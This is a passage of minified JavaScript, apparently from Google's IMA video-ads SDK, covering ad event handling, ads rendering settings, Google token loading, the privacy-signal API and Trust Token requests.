            WC(this)
        }
    };
    var WC = function(a) {
            var b = {
                type: "error"
            };
            b.session = a.D;
            a = Hh(new Fh(void 0), b);
            window.postMessage(a, "*")
        },
        VC = function(a) {
            return ("videoDisplayUnknown" == a.G ? a.h.g : a.h.K.get(a.G)).D.g
        },
        XC = function(a) {
            a.g && !Ef() && !Df() && ig(a.g, {
                visibility: "hidden"
            })
        };
    UC.prototype.N = function() {
        M.xa.N.call(this);
        Ti(this.A);
        this.A = null;
        yf(this.C);
        this.C = null;
        yf(this.l);
        this.l = null;
        var a = VC(this);
        if (null != a) {
            var b = this.J;
            a.style.cssText = b instanceof Dc && b.constructor === Dc ? b.g : "type_error:SafeStyle";
            Ef() || Df() ? (a.src = this.H, a.currentTime = this.K) : (a.removeAttribute("src"), a = this.h, null != a.h && WB(a.h.g, !1))
        } else yf(this.g), this.g = null
    };
    var YC = function(a, b) {
        L.call(this);
        this.h = a;
        this.l = b;
        this.g = new Map
    };
    t(YC, L);
    var ZC = function(a, b) {
        try {
            var c = b.la,
                d = c.session;
            switch (c.vpaidEventType) {
                case "createFriendlyIframe":
                    b = "videoDisplayUnknown";
                    c.videoDisplayName && (b = c.videoDisplayName);
                    var e = c.session,
                        f = new UC(a.h, a.l, b);
                    a.g.set(e, f);
                    f.init(e);
                    break;
                case "vpaidNonLinear":
                    var g = a.g.get(d);
                    g && XC(g);
                    break;
                case "destroyFriendlyIframe":
                    var h = a.g.get(d);
                    h && (h.W(), a.g.delete(d))
            }
        } catch (k) {
            eA().report(125, {
                msg: k.message
            })
        }
    };
    YC.prototype.N = function() {
        this.g.forEach(function(a) {
            return a.W()
        })
    };
    var $C = function() {
        this.g = [];
        this.h = []
    };
    $C.prototype.isEmpty = function() {
        return 0 === this.g.length && 0 === this.h.length
    };
    $C.prototype.clear = function() {
        this.g = [];
        this.h = []
    };
    $C.prototype.remove = function(a) {
        var b = this.g;
        b: {
            var c = b.length - 1;0 > c && (c = Math.max(0, b.length + c));
            if ("string" === typeof b) c = "string" !== typeof a || 1 != a.length ? -1 : b.lastIndexOf(a, c);
            else {
                for (; 0 <= c; c--)
                    if (c in b && b[c] === a) break b;
                c = -1
            }
        }
        0 <= c ? (yb(b, c), b = !0) : b = !1;
        return b || xb(this.h, a)
    };
    $C.prototype.Na = function() {
        for (var a = [], b = this.g.length - 1; 0 <= b; --b) a.push(this.g[b]);
        var c = this.h.length;
        for (b = 0; b < c; ++b) a.push(this.h[b]);
        return a
    };
    var Z = function(a, b, c, d, e, f, g) {
        M.call(this);
        var h = this;
        this.H = a;
        this.g = b;
        this.K = c;
        this.ib = e;
        this.o = new yA;
        this.C = g;
        this.M = !1;
        this.T = 1;
        this.kb = d;
        this.aa = -1;
        this.l = this.h = null;
        this.G = new JC({
            currentTime: 0
        }, this.C);
        this.D = new $C;
        this.da = this.X = !1;
        this.Y = new Map;
        this.$ = this.ua = !1;
        this.Va = new YC(b, g);
        Vi(this, this.Va);
        this.J = f && null != this.g.C;
        this.R = function() {
            var k = h.g.g,
                n = k.g.currentTime;
            k = k.getDuration();
            return {
                currentTime: n,
                duration: k,
                isPlaying: !0,
                volume: h.T
            }
        };
        this.V = new yu(this);
        this.V.O(this.C, "adsManager",
            this.nb)
    };
    t(Z, M);
    Z.prototype.nb = function(a) {
        var b = this,
            c = a.ha,
            d = a.la;
        switch (c) {
            case "error":
                aD(this);
                bD(this, d);
                break;
            case "contentPauseRequested":
                eA().report(130);
                cD(this);
                dD(this, c, d);
                break;
            case "contentResumeRequested":
                eD(this, function() {
                    return dD(b, c, d)
                });
                break;
            case "remainingTime":
                this.aa = d.remainingTime;
                break;
            case "skip":
                dD(this, c, d);
                break;
            case "log":
                dD(this, c, d, d.logData);
                break;
            case "companionBackfill":
                a = Ka("window.google_show_companion_ad");
                null != a && a();
                break;
            case "skipShown":
                this.M = !0;
                dD(this, c, d);
                break;
            case "interaction":
                dD(this, c, d, d.interactionData);
                break;
            case "vpaidEvent":
                ZC(this.Va, a);
                break;
            case "skippableStateChanged":
                a = d.adData;
                null != a.skippable && (this.M = a.skippable);
                dD(this, c, d);
                break;
            case "volumeChange":
                a = d.adData;
                null != a && "number" === typeof a.volume && (this.T = a.volume);
                dD(this, c, d);
                break;
            case "firstQuartile":
                dD(this, By.firstQuartile, d);
                dD(this, c, d);
                break;
            case "thirdQuartile":
                dD(this, By.thirdQuartile, d);
                dD(this, c, d);
                break;
            default:
                dD(this, c, d)
        }
    };
    var dD = function(a, b, c, d) {
            if (null == c.companions) {
                var e = a.Y.get(c.adId);
                c.companions = null != e ? e : []
            }
            var f = c.adData;
            if (e = null == f ? null : new Y(f)) a.h = e;
            switch (b) {
                case "adBreakReady":
                case "mediaUrlPinged":
                    b = new FC(b, null, c);
                    break;
                case "adMetadata":
                    b = null;
                    null != c.adCuePoints && (b = new DB(c.adCuePoints));
                    b = new HC(e, b);
                    break;
                case "allAdsCompleted":
                    a.h = null;
                    a.ua = !0;
                    b = new FC(b, e);
                    break;
                case "contentPauseRequested":
                    a.$ = !1;
                    b = new FC(b, e);
                    break;
                case "contentResumeRequested":
                    a.h = null;
                    a.$ = !0;
                    b = new FC(b, e);
                    break;
                case "loaded":
                    a.aa =
                        e.getDuration();
                    a.M = !1;
                    py() && (d = a.H, c = a.ib, d.h.set(jA(e), a.R), (0 != W.g ? G(fr).l : d.A) && rA(d, "loaded", jA(e), c));
                    b = new FC(b, e, f);
                    break;
                case "start":
                    a.Y.set(c.adId, c.companions);
                    null != pC(a.g) && (null == a.l ? (a.l = new Cz, a.V.O(a.l, "click", a.bf)) : Gz(a.l), Ez(a.l, pC(a.g)));
                    b = new FC(b, e);
                    break;
                case "complete":
                    null != a.l && Gz(a.l);
                    py() && tA(a.H, a.R, jA(e));
                    a.h = null;
                    a.Y.delete(c.adId);
                    b = new FC(b, e);
                    break;
                case "log":
                    c = null;
                    null != d && null != d.type ? (f = d.type, f = "adLoadError" == f || "adPlayError" == f) : f = !1;
                    f && (c = {
                        adError: new BC(d)
                    });
                    b = new FC(b, e, c);
                    break;
                case "interaction":
                    b = new FC(b, e, d);
                    break;
                case "adProgress":
                    b = new FC(b, e, new IC(c));
                    break;
                default:
                    b = new FC(b, e)
            }
            a.dispatchEvent(b);
            a.ua && a.$ && a.destroy()
        },
        bD = function(a, b) {
            var c = new DC(new BC(b));
            a.X ? (a.dispatchEvent(c), py() && a.h && tA(a.H, a.R, jA(a.h)), a.h = null) : a.D.h.push(c);
            a = {
                error: b.errorCode,
                vis: ih(document)
            };
            eA().report(7, a)
        },
        fD = function(a, b, c) {
            Dy(a.C, "adsManager", b, c)
        },
        eD = function(a, b) {
            eA().report(131);
            aD(a, b)
        },
        cD = function(a) {
            var b = a.g.g;
            zC(a.g) && a.o.restoreCustomPlaybackStateOnAdBreakComplete &&
                null != b.gd && b.gd()
        },
        aD = function(a, b) {
            var c = a.g.g;
            zC(a.g) && a.o.restoreCustomPlaybackStateOnAdBreakComplete && null != c.Nb ? c.Nb(b) : b && b()
        };
    l = Z.prototype;
    l.init = function(a, b, c, d) {
        if (this.D.isEmpty()) {
            var e = this.g,
                f = null;
            e.A && null == d && (f = {
                vd: "setnull"
            });
            e.A && e.A === d && (f = {
                vd: "match"
            });
            if (e.A && e.A !== d) {
                f = oy(d || null);
                var g = ru(d || null);
                f = {
                    vd: "diff",
                    oc: e.Y,
                    nc: f,
                    oi: e.X,
                    ni: g
                }
            }!e.A && d && (f = {
                vd: "new"
            });
            f && (f.custVid = e.V, eA().report(93, f));
            null != d && (e.D = yC(d), ny(e.D) && (e.T = !0, Ti(e.h), Ti(e.o), Ti(e.l), e.h = null, e.o = null, e.l = null, Ti(e.g), e.g = new JB(d), "function" !== typeof d.getBoundingClientRect ? (e.L = e.B, W.l = e.L) : e.L = d, null != (d = e.I.G) && (e = e.g.D.g, d.o = e, d.g && (d = d.g,
                d.g = e, BB(d, e)))));
            this.X = !0;
            this.resize(a, b, c);
            e = zA(this.o, this.J);
            fD(this, "init", {
                adsRenderingSettings: e,
                width: a,
                height: b,
                viewMode: c
            })
        } else {
            for (; !this.D.isEmpty();) b = a = this.D, 0 === b.g.length && (b.g = b.h, b.g.reverse(), b.h = []), a = a.g.pop(), this.dispatchEvent(a);
            this.W()
        }
    };
    l.Se = function() {
        return zC(this.g)
    };
    l.Re = function() {
        return this.J
    };
    l.getRemainingTime = function() {
        return this.aa
    };
    l.getAdSkippableState = function() {
        return this.M
    };
    l.ye = function() {
        fD(this, "discardAdBreak")
    };
    l.updateAdsRenderingSettings = function(a) {
        if (null != a) {
            var b = this.o.bitrate,
                c = a.bitrate;
            eA().report(96, {
                init: this.X ? "1" : "0",
                start: this.da ? "1" : "0",
                old: b,
                "new": c,
                changed: b != c ? "1" : "0"
            });
            this.o = a;
            a = zA(this.o, this.J);
            fD(this, "updateAdsRenderingSettings", {
                adsRenderingSettings: a
            })
        }
    };
    l.skip = function() {
        fD(this, "skip")
    };
    l.start = function() {
        if (this.K) {
            (Cd || Ed) && eA().report(50, {
                customPlayback: zC(this.g)
            });
            this.g.H || eA().report(26, {
                adtagurl: this.K,
                customPlayback: zC(this.g)
            });
            Hm(this.g.B) && eA().report(30, {
                adtagurl: this.K,
                customPlayback: zC(this.g)
            });
            var a = this.g.C,
                b = this.g.B,
                c;
            if (c = a && b && !Hm(a)) a = pA(a), b = pA(b), c = 0 < a.width && 0 < a.height && 0 < b.width && 0 < b.height && a.left <= b.left + b.width && b.left <= a.left + a.width && a.top <= b.top + b.height && b.top <= a.top + a.height;
            c && eA().report(31, {
                adtagurl: this.K,
                customPlayback: zC(this.g)
            })
        }
        if (!this.g.H &&
            !zC(this.g)) throw Ky(Iy);
        b = this.g;
        b.R = this.J && null != b.C;
        this.g.I.g.style.opacity = 1;
        null != this.A && 1 == this.getVolume() && ("boolean" === typeof this.A.muted && this.A.muted ? this.setVolume(0) : "number" === typeof this.A.volume && (b = this.A.volume, 0 <= b && 1 >= b && this.setVolume(this.A.volume)));
        this.da = !0;
        fD(this, "start")
    };
    l.bf = function() {
        if (!this.o.disableClickThrough && null != this.h) {
            var a = this.h.g.clickThroughUrl;
            if (null != a) {
                var b = this.h.g.attributionParams;
                Wu(a, b);
                eA().report(156, {
                    pe: !!b
                })
            }
        }
    };
    l.resize = function(a, b, c) {
        var d = this.g,
            e = d.B;
        null != e && (-1 == a ? (e.style.right = "0", e.style.left = "0") : e.style.width = a + "px", -1 == b ? (e.style.bottom = "0", e.style.top = "0") : e.style.height = b + "px");
        e = d.I;
        e.g.width = -1 == a ? "100%" : a;
        e.g.height = -1 == b ? "100%" : b;
        try {
            e.g.offsetTop = e.g.offsetTop
        } catch (f) {}
        d.M = new lf(a, b);
        fD(this, "resize", {
            width: a,
            height: b,
            viewMode: c
        })
    };
    l.stop = function() {
        fD(this, "stop")
    };
    l.expand = function() {
        fD(this, "expand")
    };
    l.collapse = function() {
        fD(this, "collapse")
    };
    l.getVolume = function() {
        return this.T
    };
    l.setVolume = function(a) {
        this.T = a;
        this.g.g.setVolume(a);
        fD(this, "volume", {
            volume: a
        })
    };
    l.pause = function() {
        fD(this, "pause")
    };
    l.resume = function() {
        fD(this, "resume")
    };
    l.destroy = function() {
        this.W()
    };
    l.getCuePoints = function() {
        return this.kb
    };
    l.getCurrentAd = function() {
        return this.h
    };
    l.N = function() {
        fD(this, "destroy");
        null != this.l && this.l.W();
        this.V.W();
        this.D.clear();
        this.G && (this.G.stop(), this.G.W());
        py() && tA(this.H, this.R);
        M.prototype.N.call(this)
    };
    l.clicked = function() {
        eA().report(124, {
            api: "clicked"
        });
        var a = this.h && this.h.g.clickThroughUrl;
        if (a && this.h.isUiDisabled()) {
            var b = this.h.g.attributionParams;
            Wu(a, b);
            eA().report(156, {
                pe: !!b
            })
        }
        fD(this, "click")
    };
    l.focus = function() {
        Dy(this.C, "userInteraction", "focusUiElement")
    };
    Z.prototype.clicked = Z.prototype.clicked;
    Z.prototype.getCurrentAd = Z.prototype.getCurrentAd;
    Z.prototype.getCuePoints = Z.prototype.getCuePoints;
    Z.prototype.destroy = Z.prototype.destroy;
    Z.prototype.resume = Z.prototype.resume;
    Z.prototype.pause = Z.prototype.pause;
    Z.prototype.setVolume = Z.prototype.setVolume;
    Z.prototype.getVolume = Z.prototype.getVolume;
    Z.prototype.collapse = Z.prototype.collapse;
    Z.prototype.expand = Z.prototype.expand;
    Z.prototype.stop = Z.prototype.stop;
    Z.prototype.resize = Z.prototype.resize;
    Z.prototype.start = Z.prototype.start;
    Z.prototype.skip = Z.prototype.skip;
    Z.prototype.updateAdsRenderingSettings = Z.prototype.updateAdsRenderingSettings;
    Z.prototype.discardAdBreak = Z.prototype.ye;
    Z.prototype.getAdSkippableState = Z.prototype.getAdSkippableState;
    Z.prototype.getRemainingTime = Z.prototype.getRemainingTime;
    Z.prototype.isCustomClickTrackingUsed = Z.prototype.Re;
    Z.prototype.isCustomPlaybackUsed = Z.prototype.Se;
    Z.prototype.init = Z.prototype.init;
    var gD = function(a, b) {
        Wi.call(this, "adsManagerLoaded");
        this.g = a;
        this.l = b
    };
    t(gD, Wi);
    gD.prototype.getAdsManager = function(a, b) {
        a = a || {
            currentTime: null
        };
        var c = this.g;
        c.A = a;
        null != a.currentTime && (c.G = new JC(a, c.C), c.G.start());
        null != b && (c.o = b);
        return this.g
    };
    gD.prototype.getUserRequestContext = function() {
        return this.l
    };
    gD.prototype.getUserRequestContext = gD.prototype.getUserRequestContext;
    gD.prototype.getAdsManager = gD.prototype.getAdsManager;
    var hD = {
        ADS_MANAGER_LOADED: "adsManagerLoaded"
    };
    y("module$contents$ima$AdsManagerLoadedEvent_AdsManagerLoadedEvent.Type", hD, void 0);
    var iD = function() {
        this.videoPlayMuted = this.videoPlayActivation = "unknown";
        this.videoContinuousPlay = "0";
        this.nonLinearAdSlotHeight = this.nonLinearAdSlotWidth = this.linearAdSlotHeight = this.linearAdSlotWidth = this.liveStreamPrefetchSeconds = 0;
        this.forceNonLinearFullSlot = !1;
        this.contentTitle = this.contentKeywords = this.contentDuration = null;
        this.vastLoadTimeout = 5E3;
        this.omidAccessModeRules = {};
        this.pageUrl = null
    };
    iD.prototype.setAdWillAutoPlay = function(a) {
        this.videoPlayActivation = a ? "auto" : "click"
    };
    iD.prototype.setAdWillPlayMuted = function(a) {
        this.videoPlayMuted = a ? "muted" : "unmuted"
    };
    iD.prototype.setContinuousPlayback = function(a) {
        this.videoContinuousPlay = a ? "2" : "1"
    };
    iD.prototype.setContinuousPlayback = iD.prototype.setContinuousPlayback;
    iD.prototype.setAdWillPlayMuted = iD.prototype.setAdWillPlayMuted;
    iD.prototype.setAdWillAutoPlay = iD.prototype.setAdWillAutoPlay;
    var jD = function(a) {
        var b = document;
        try {
            var c = As(b);
            var d = c ? xe(Cs, c ? JSON.parse(c) : null) : null
        } catch (e) {
            d = null
        }
        if (!d) return 0;
        if (Be(d, 7)) return 4;
        if (a) {
            if (wb(C(d, 3), a)) return 2;
            if (wb(C(d, 4), a)) return 3
        }
        return 1
    };

    function kD(a, b, c) {
        b = Be(b, 5) && "null" !== c.origin ? c.document.cookie : null;
        return null === b ? null : (new xs({
            cookie: b
        })).get(a) || ""
    };
    var lD = function() {
            this.g = window;
            this.h = 0
        },
        mD = function(a, b) {
            return b ? b ? kD("__gads", b, a.g) : null : null
        };
    var nD = function(a, b, c) {
        var d = "script";
        d = void 0 === d ? "" : d;
        var e = a.createElement("link");
        try {
            if (e.rel = "preload", sc("preload", "stylesheet")) {
                e.href = gc(b).toString();
                var f = Vc('style[nonce],link[rel="stylesheet"][nonce]', e.ownerDocument && e.ownerDocument.defaultView);
                f && e.setAttribute("nonce", f)
            } else {
                if (b instanceof fc) var g = gc(b).toString();
                else {
                    if (b instanceof wc) var h = xc(b);
                    else {
                        if (b instanceof wc) var k = b;
                        else b = "object" == typeof b && b.Qa ? b.Fa() : String(b), Ac.test(b) || (b = "about:invalid#zClosurez"), k = new wc(b,
                            vc);
                        h = xc(k)
                    }
                    g = h
                }
                e.href = g
            }
        } catch (n) {
            return
        }
        d && (e.as = d);
        c && e.setAttribute("nonce", c);
        if (a = a.getElementsByTagName("head")[0]) try {
            a.appendChild(e)
        } catch (n) {}
    };
    var oD = /^\.google\.(com?\.)?[a-z]{2,3}$/,
        pD = /\.(cn|com\.bi|do|sl|ba|by|ma|am)$/,
        qD = u,
        sD = function(a) {
            a = "https://adservice" + (a + "/adsid/integrator.js");
            var b = ["domain=" + encodeURIComponent(u.location.hostname)];
            rD[3] >= Ya() && b.push("adsid=" + encodeURIComponent(rD[1]));
            return a + "?" + b.join("&")
        },
        rD, tD, uD = function() {
            qD = u;
            rD = qD.googleToken = qD.googleToken || {};
            var a = Ya();
            rD[1] && rD[3] > a && 0 < rD[2] || (rD[1] = "", rD[2] = -1, rD[3] = -1, rD[4] = "", rD[6] = "");
            tD = qD.googleIMState = qD.googleIMState || {};
            a = tD[1];
            oD.test(a) && !pD.test(a) ||
                (tD[1] = ".google.com");
            Array.isArray(tD[5]) || (tD[5] = []);
            "boolean" !== typeof tD[6] && (tD[6] = !1);
            Array.isArray(tD[7]) || (tD[7] = []);
            "number" !== typeof tD[8] && (tD[8] = 0)
        },
        vD = {
            Ac: function() {
                return 0 < tD[8]
            },
            gf: function() {
                tD[8]++
            },
            hf: function() {
                0 < tD[8] && tD[8]--
            },
            jf: function() {
                tD[8] = 0
            },
            zh: function() {
                return !1
            },
            yd: function() {
                return tD[5]
            },
            qd: function(a) {
                try {
                    a()
                } catch (b) {
                    u.setTimeout(function() {
                        throw b;
                    }, 0)
                }
            },
            Id: function() {
                if (!vD.Ac()) {
                    var a = u.document,
                        b = function(e) {
                            e = sD(e);
                            a: {
                                try {
                                    var f = Vc("script[nonce]", void 0);
                                    break a
                                } catch (g) {}
                                f = void 0
                            }
                            nD(a, e, f);
                            f = a.createElement("script");
                            f.type = "text/javascript";
                            f.onerror = function() {
                                return u.processGoogleToken({}, 2)
                            };
                            uu();
                            e = hc(e);
                            f.src = af(e);
                            cf(f);
                            try {
                                (a.head || a.body || a.documentElement).appendChild(f), vD.gf()
                            } catch (g) {}
                        },
                        c = tD[1];
                    b(c);
                    ".google.com" != c && b(".google.com");
                    b = {};
                    var d = (b.newToken = "FBT", b);
                    u.setTimeout(function() {
                        return u.processGoogleToken(d, 1)
                    }, 1E3)
                }
            }
        },
        wD = function(a) {
            uD();
            var b = qD.googleToken[5] || 0;
            a && (0 != b || rD[3] >= Ya() ? vD.qd(a) : (vD.yd().push(a), vD.Id()));
            rD[3] >= Ya() && rD[2] >= Ya() || vD.Id()
        },
        xD = function(a) {
            u.processGoogleToken = u.processGoogleToken || function(b, c) {
                var d = b;
                d = void 0 === d ? {} : d;
                c = void 0 === c ? 0 : c;
                b = d.newToken || "";
                var e = "NT" == b,
                    f = parseInt(d.freshLifetimeSecs || "", 10),
                    g = parseInt(d.validLifetimeSecs || "", 10),
                    h = d["1p_jar"] || "";
                d = d.pucrd || "";
                uD();
                1 == c ? vD.jf() : vD.hf();
                var k = qD.googleToken = qD.googleToken || {},
                    n = 0 == c && b && "string" === typeof b && !e && "number" === typeof f && 0 < f && "number" === typeof g && 0 < g && "string" === typeof h;
                e = e && !vD.Ac() && (!(rD[3] >= Ya()) || "NT" ==
                    rD[1]);
                var m = !(rD[3] >= Ya()) && 0 != c;
                if (n || e || m) e = Ya(), f = e + 1E3 * f, g = e + 1E3 * g, 1E-5 > Math.random() && bg(u, "https://pagead2.googlesyndication.com/pagead/gen_204?id=imerr&err=" + c), k[5] = c, k[1] = b, k[2] = f, k[3] = g, k[4] = h, k[6] = d, uD();
                if (n || !vD.Ac()) {
                    c = vD.yd();
                    for (b = 0; b < c.length; b++) vD.qd(c[b]);
                    c.length = 0
                }
            };
            wD(a)
        };
    var yD = function(a, b) {
        b = void 0 === b ? 500 : b;
        L.call(this);
        this.h = a;
        this.B = b;
        this.g = null;
        this.o = {};
        this.A = 0;
        this.l = null
    };
    t(yD, L);
    yD.prototype.N = function() {
        this.o = {};
        this.l && (gf(this.h, "message", this.l), delete this.l);
        delete this.o;
        delete this.h;
        delete this.g;
        L.prototype.N.call(this)
    };
    var AD = function(a) {
            var b;
            return "function" === typeof(null === (b = a.h) || void 0 === b ? void 0 : b.__uspapi) || null != zD(a)
        },
        CD = function(a, b) {
            var c = {};
            if (AD(a)) {
                var d = kb(function() {
                    return b(c)
                });
                BD(a, function(e, f) {
                    f && (c = e);
                    d()
                });
                setTimeout(d, a.B)
            } else b(c)
        },
        BD = function(a, b) {
            var c, d;
            if ("function" === typeof(null === (c = a.h) || void 0 === c ? void 0 : c.__uspapi))(null === (d = a.h) || void 0 === d ? void 0 : d.__uspapi)("getUSPData", 1, b);
            else if (zD(a)) {
                DD(a);
                var e = ++a.A;
                a.o[e] = b;
                a.g && (b = {}, a.g.postMessage((b.__uspapiCall = {
                    command: "getUSPData",
                    version: 1,
                    callId: e
                }, b), "*"))
            }
        },
        zD = function(a) {
            if (a.g) return a.g;
            a.g = Vf(a.h, "__uspapiLocator");
            return a.g
        },
        DD = function(a) {
            a.l || (a.l = function(b) {
                var c;
                try {
                    var d = {};
                    "string" === typeof b.data ? d = JSON.parse(b.data) : d = b.data;
                    var e = d.__uspapiReturn;
                    null === (c = a.o) || void 0 === c ? void 0 : c[e.callId](e.returnValue, e.success)
                } catch (f) {}
            }, ff(a.h, "message", a.l))
        };
    var ED = function(a) {
            a = void 0 === a ? window : a;
            return !a.PeriodicSyncManager
        },
        FD = function() {
            var a = void 0 === a ? window : a;
            if (!ED(a) && Kg(Eg) || ED(a) && Kg(Fg)) {
                a = a.navigator.userAgent;
                var b = /Chrome/.test(a);
                return /Android/.test(a) && b
            }
            return !1
        },
        GD = {
            issuerOrigin: "https://attestation.android.com",
            issuancePath: "/att/i",
            redemptionPath: "/att/r",
            shouldRedeemToken: function() {
                return FD()
            },
            shouldRequestToken: function() {
                return FD()
            }
        };
    var HD = ["A88otRz1Fd3Nt567e2IYshC18LL3KGVXpVJW9oTCId4RYaygt23pbb4JqrbdIO/bwZPWEmRjBIRBu/bZbDR7Pg4AAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MzQwODMxOTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=", "A0gCLbXCcL0R1Oc8tFPDs0G4Elz17w3zHp+Zst66+D17veE2o7fUcPsA114QtSTRqfVJLMeTSdeWOom0CcyCsgYAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MzQwODMxOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9",
            "A9RQ+LxFazAousxUwSCzaihJjHLO1UyjQp0teZKHl7WdbVjPDfHSKMd6D/ZI5MTjqClFycbl70EFd7cBJWXqKQEAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MzQwODMxOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9", "A6WKeWsdn1Ct+ZPqS9NCxxaiBoQ7wdTkK2/gE69Yu0gfBKJfo1gOvgkGmf5/xaIajT/RUb9AbnF1FsSZ47cCcQcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MzQwODMxOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9",
            "A04ZCu7yjrHgwQJK5ISHhH1DSg0qqowEay3n70KO6wV3D2Mj+OX3Kw20aSMitzgdG1xfrN7sOJV/dZIk+RvCzA4AAAB2eyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IlRydXN0VG9rZW5zIiwiZXhwaXJ5IjoxNjM0MDgzMTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="
        ],
        KD = function(a, b, c) {
            b = void 0 === b ? null : b;
            c = void 0 === c ? !1 : c;
            L.call(this);
            Kg(Dg) || Kg(Hg) || ID();
            this.h = c;
            this.g = [];
            Kg(Ig) ? FD() && this.g.push(GD) : this.g = b || [GD];
            if (document.hasTrustToken && !Kg(Gg) && !Array.isArray(window.goog_tt_state)) {
                var d = JD(this);
                Object.defineProperty(window,
                    "goog_tt_state", {
                        configurable: !1,
                        get: function() {
                            return d.slice()
                        }
                    })
            }
        };
    t(KD, L);
    var ID = function() {
            var a = void 0 === a ? window.document : a;
            Wf(HD, a)
        },
        JD = function(a) {
            return a.g.map(function(b) {
                return {
                    issuerOrigin: b.issuerOrigin,
                    state: Kg(Hg) && !a.h ? 12 : 1
                }
            })
        },
        LD = function(a, b) {
            var c = window.goog_tt_state.find(function(d) {
                return d.issuerOrigin === a
            });
            c && (c.state = b)
        },
        MD = function() {
            var a = window.goog_tt_state;
            return Array.isArray(a) && a.some(function(b) {
                return 1 != b.state
            })
        },
        ND = function(a) {
            var b = "" + a.issuerOrigin + a.redemptionPath,
                c = {
                    keepalive: !0,
                    redirect: "follow",
                    method: "get",
                    trustToken: {
                        type: "token-redemption",
                        issuer: a.issuerOrigin,
                        refreshPolicy: "none"
                    }
                };
            LD(a.issuerOrigin, 2);
            return window.fetch(b, c).then(function(d) {
                if (!d.ok) throw Error(d.status + ": Network response was not ok!");
                LD(a.issuerOrigin, 6)
            }).catch(function(d) {
                d && "NoModificationAllowedError" === d.name ? LD(a.issuerOrigin, 6) : LD(a.issuerOrigin, 5)
            })
        },
        OD = function(a, b) {
            var c = "" + a.issuerOrigin + a.issuancePath;
            LD(a.issuerOrigin, 8);
            return window.fetch(c, {
                trustToken: {
                    type: "token-request"
                }
            }).then(function(d) {
                if (!d.ok) throw Error(d.status + ": Network response was not ok!");
                LD(a.issuerOrigin, 10);
                if (b) return ND(a)
            }).catch(function(d) {
                if (d && "NoModificationAllowedError" === d.name) {
                    if (LD(a.issuerOrigin, 10), b) return ND(a)
                } else LD(a.issuerOrigin, 9)
            })
        },
        PD = function() {
            LD(GD.issuerOrigin, 13);
            return document.hasTrustToken(GD.issuerOrigin).then(function(a) {
                return a ? ND(GD) : OD(GD, !0)
            })
        },
        QD = function(a) {
            if (document.hasTrustToken && !Kg(Gg) && (!Kg(Hg) || a.h) && !MD()) {
                var b = [];
                Kg(Ig) ? FD() && b.push(PD()) : a.g.forEach(function(c) {
                    LD(c.issuerOrigin, 13);
                    var d = c.shouldRedeemToken(),
                        e = c.shouldRequestToken();
                    if (d || e) {
                        var f = document.hasTrustToken(c.issuerOrigin).then(function(g) {
                            if (g) {
                                if (d) return ND(c)
                            } else {
                                if (e) return OD(c, d);
                                LD(c.issuerOrigin, 3)
                            }
                        });
                        b.push(f)
                    } else LD(c.issuerOrigin, 7)
                });
                window.Promise && window.Promise.all && (a = window.Promise.all(b), "object" != typeof window.goog_tt_promise && Object.defineProperty(window, "goog_tt_promise", {
                    configurable: !1,
                    value: a,
                    writable: !1
                }))
            }
        };
    (function() {
        if (!Ib(function(b) {
                return b.match(E().location.href)
            })) {
            var a = $z(qf());
            null == a && document.querySelectorAll && (a = $z(document.querySelectorAll("script")));
            if (null == a) throw Error("IMA SDK is either not loaded from a google domain or is not a supported version.");
        }
    })();
    var SD = function(a) {
        M.call(this);
        var b = this,
            c = Px(Rx(this.getSettings()));
        c && 0 < c.length && (Vh.reset(), Xh(new yi(c)));
        this.D = new lD;
        this.g = a;
        this.G = new Map;
        this.l = this.g.I;
        this.H = new yu(this);
        Vi(this, this.H);
        this.J = new Ux(window);
        this.K = new yD(window);
        this.o = null;
        this.A = {};
        0 != W.g ? (this.h = new lA, Vi(this, this.h)) : this.h = nA();
        py() && (this.h.init(mC(this.l)), this.C = sA(this.h, this.g.L), Ui(this, function() {
            var d = b.C;
            b.h.o.delete(d);
            0 != W.g && (G(fr).B[d] = null)
        }));
        Sh(Ni) && RD(this)
    };
    t(SD, M);
    SD.prototype.destroy = function() {
        this.W()
    };
    SD.prototype.getVersion = function() {
        return "h.3.479.1"
    };
    SD.prototype.requestAds = function(a, b) {
        var c = this,
            d = [],
            e = null;
        Wx(this.J) && d.push(new Promise(function(g) {
            Zx(c.J, function(h) {
                e = h;
                g()
            })
        }));
        var f = null;
        AD(this.K) && d.push(new Promise(function(g) {
            CD(c.K, function(h) {
                f = h;
                g()
            })
        }));
        Promise.all(d).then(function() {
            TD(c, a, b, {
                Vc: e,
                Zc: f
            })
        })
    };
    var TD = function(a, b, c, d) {
        var e = b.adTagUrl;
        e && eA().report(8, {
            adtagurl: e,
            customPlayback: zC(a.g),
            customClick: null != a.g.C
        });
        var f = "goog_" + $c++;
        a.G.set(f, c || null);
        var g = UD({
            adTagUrl: e,
            Dd: !1,
            Vc: d.Vc,
            Zc: d.Zc
        });
        a.o = dy(e, g || {});
        VD(fy(a.o)) ? WD().then(function() {
            XD(a, f, b, g)
        }) : XD(a, f, b, g)
    };
    SD.prototype.getSettings = function() {
        return W
    };
    SD.prototype.contentComplete = function() {
        Dy(mC(this.l), "adsLoader", "contentComplete")
    };
    var VD = function(a) {
        return a ? !1 : !my()
    };
    SD.prototype.M = function(a) {
        var b = a.ha;
        switch (b) {
            case "adsLoaded":
                b = a.la;
                a = a.Mb;
